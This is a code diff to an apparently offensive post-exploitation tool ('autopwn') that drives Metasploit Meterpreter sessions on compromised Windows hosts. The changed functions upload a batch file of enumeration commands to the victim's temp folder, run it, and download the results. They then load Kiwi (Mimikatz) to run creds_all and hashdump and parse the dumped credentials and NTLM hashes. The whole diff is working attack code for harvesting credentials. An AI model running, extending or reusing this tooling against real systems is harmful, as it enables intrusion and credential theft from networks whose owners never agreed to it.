@@ -192,32 +192,47 @@ def _run_secretsdump(host: str, username: str, password: str, domain: str) -> li
 # Meterpreter RC script execution (for hosts with active meterpreter sessions)
 # ---------------------------------------------------------------------------
 
+def _build_batch_file() -> str:
+    """
+    Build a Windows batch script that runs all enumeration commands and
+    writes output to a single results file.  Avoids all quoting issues
+    by keeping every command in its native batch syntax.
+    """
+    # Each command writes a header then its output to the results file
+    results_path = r"C:\Windows\Temp\autopwn_postex.txt"
+    lines = ["@echo off", f'echo. > "{results_path}"']
+    for cmd in WINDOWS_COMMANDS:
+        lines.append(f'echo ===CMD=== {cmd} >> "{results_path}"')
+        lines.append(f'{cmd} >> "{results_path}" 2>&1')
+        lines.append(f'echo ===END=== >> "{results_path}"')
+    return "\r\n".join(lines) + "\r\n"
+
+
 def _build_meterpreter_rc(host: str, session_id: int) -> str:
     """
     Generate a Metasploit resource script that:
-      1. Selects the active session
-      2. Runs all Windows enumeration commands via the Meterpreter 'execute' command
-      3. Loads Kiwi and dumps all credentials
-      4. Runs hashdump
+      1. Uploads a batch file containing all enumeration commands
+      2. Executes it inside cmd.exe (no nested quoting issues)
+      3. Downloads the results file
+      4. Loads Kiwi and runs creds_all + hashdump
 
-    Uses 'execute -f cmd.exe -a "/c <cmd>" -i' instead of nested shell quoting
-    to avoid double-quote escaping issues with commands like findstr /C:"OS".
+    The batch file approach avoids double-quote escaping problems that
+    occur with commands like findstr /C:"OS" in nested shell invocations.
     """
-    shell_cmds = []
-    for cmd in WINDOWS_COMMANDS:
-        # Use single quotes around the -c argument to avoid conflicts with
-        # double quotes inside Windows commands (e.g. findstr /C:"OS")
-        escaped = cmd.replace("'", "'\\''")
-        shell_cmds.append(
-            f"sessions -i {session_id} -c 'execute -f cmd.exe -a \"/c {escaped}\" -H -i'"
-        )
-    shell_block = "\n".join(shell_cmds)
+    batch_local  = f"/tmp/autopwn_postex_{host.replace('.', '_')}.bat"
+    batch_remote = r"C:\\Windows\\Temp\\autopwn_postex.bat"
+    results_remote = r"C:\\Windows\\Temp\\autopwn_postex.txt"
+    results_local  = f"/tmp/autopwn_postex_{host.replace('.', '_')}.txt"
+
     rc = textwrap.dedent(f"""\
         sessions -i {session_id}
-        {shell_block}
-        sessions -i {session_id} -c "load kiwi"
-        sessions -i {session_id} -c "creds_all"
-        sessions -i {session_id} -c "hashdump"
+        upload {batch_local} {batch_remote}
+        execute -f cmd.exe -a "/c {batch_remote}" -H -w
+        sleep 15
+        download {results_remote} {results_local}
+        load kiwi
+        creds_all
+        hashdump
         exit
     """)
     return rc
@@ -225,11 +240,17 @@ def _build_meterpreter_rc(host: str, session_id: int) -> str:
 
 def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], list[dict]]:
     """
-    Execute post-ex commands via a Meterpreter session using an RC script.
+    Execute post-ex commands via a Meterpreter session.
+    Uploads a batch file, executes it, downloads results, then runs kiwi/hashdump.
     Returns (commands_run_list, credentials_found_list).
     """
-    rc_content = _build_meterpreter_rc(host, session_id)
+    batch_local = pathlib.Path(f"/tmp/autopwn_postex_{host.replace('.', '_')}.bat")
+    results_local = pathlib.Path(f"/tmp/autopwn_postex_{host.replace('.', '_')}.txt")
     rc_path = pathlib.Path(f"/tmp/autopwn_postex_{host.replace('.', '_')}.rc")
+
+    # Write the batch file and RC script
+    batch_local.write_text(_build_batch_file())
+    rc_content = _build_meterpreter_rc(host, session_id)
     rc_path.write_text(rc_content)
 
     print(f"[postex]   Running Meterpreter post-ex RC for session {session_id} on {host}...")
@@ -240,7 +261,7 @@ def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], lis
             text=True,
             timeout=MSF_TIMEOUT,
         )
-        output = result.stdout + result.stderr
+        msf_output = result.stdout + result.stderr
     except FileNotFoundError:
         print("[postex]   msfconsole not found; skipping Meterpreter post-ex.")
         return [], []
@@ -249,15 +270,37 @@ def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], lis
         return [], []
     finally:
         rc_path.unlink(missing_ok=True)
+        batch_local.unlink(missing_ok=True)
 
-    # Parse credential output from kiwi and hashdump
-    creds_found = _parse_ntlm_hashes(output) + _parse_kiwi_output(output)
+    # Parse the downloaded results file into per-command entries
+    commands_run: list[dict] = []
+    if results_local.exists():
+        raw = results_local.read_text(errors="replace")
+        # Split on ===CMD=== markers
+        import re as _re
+        blocks = _re.split(r"===CMD=== ", raw)
+        for block in blocks:
+            block = block.strip()
+            if not block:
+                continue
+            # First line is the command, rest until ===END=== is output
+            end_idx = block.find("===END===")
+            if end_idx != -1:
+                block = block[:end_idx]
+            lines = block.split("\n", 1)
+            cmd_name = lines[0].strip()
+            cmd_output = lines[1].strip() if len(lines) > 1 else "(no output)"
+            commands_run.append({"command": cmd_name, "output": cmd_output})
+        results_local.unlink(missing_ok=True)
+    else:
+        # Fallback: return raw msfconsole output if download failed
+        commands_run.append({
+            "command": "msfconsole post-ex RC (batch upload failed — raw output)",
+            "output": msf_output[:8000],
+        })
 
-    # Build a single commands_run entry with the full MSF output
-    commands_run = [{
-        "command": "msfconsole post-ex RC (whoami/ipconfig/kiwi/hashdump)",
-        "output": output[:8000],  # cap at 8 KB to keep JSON manageable
-    }]
+    # Parse credential output from kiwi and hashdump in msfconsole output
+    creds_found = _parse_ntlm_hashes(msf_output) + _parse_kiwi_output(msf_output)
 
     return commands_run, creds_found
 
